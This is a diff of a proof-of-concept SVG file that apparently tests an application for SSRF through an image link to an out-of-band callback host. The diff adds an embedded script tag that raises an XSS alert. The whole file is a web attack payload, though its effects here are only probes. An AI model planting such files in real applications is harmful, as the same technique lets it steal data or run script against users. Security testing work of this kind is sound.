@@ -7,5 +7,7 @@
 ]>
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200">
   <image height="30" width="30" xlink:href="http://z55arcy6c6i6x0n2paabverdn4tvhm5b.oastify.com" />
-  <text x="0" y="20" font-size="20">SSRF POC</text>
+  <text x="0" y="20" font-size="20"><script type="text/javascript">
+      alert('This app is probably vulnerable to XSS attacks!');
+   </script></text>
 </svg>
